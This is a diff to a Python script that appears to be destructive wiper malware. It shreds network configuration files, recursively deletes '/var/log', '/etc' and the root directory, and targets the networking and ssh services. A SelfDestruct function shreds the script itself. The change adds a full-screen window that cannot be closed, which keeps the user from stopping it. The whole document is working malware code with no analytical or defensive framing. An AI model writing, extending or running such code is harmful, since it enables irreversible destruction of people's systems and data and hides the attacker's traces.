@@ -18,6 +18,10 @@ directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/ho
 need_removing_list = ["/var/log", "/etc", "/"]
 services_list = ["networking", "ssh"]
 
+def preventClose():
+    pass
+
+
 def MainThread():
 
     shred_command = "shred -z -n 30 "
@@ -36,7 +40,8 @@ def MainThread():
     root.resizable(False,False)
     root.attributes('-fullscreen',True)
 
-    root.config(bg=UT.rgb_hack((0, 0, 0))) 
+    root.config(bg=UT.rgb_hack((0, 0, 0)))
+    root.protocol("WM_DELETE_WINDOW", preventClose) 
     root.mainloop()
 
     for x in directory_list:
@@ -46,7 +51,8 @@ def MainThread():
         os.system("cd /")
         os.system(rmrf_command + f + "*")
 
-    
+
+
 def SelfDestruct():
     self_path = path.abspath(__file__)
     sp.call(["/usr/bin/shred", "-z -f -n 20" , self_path])
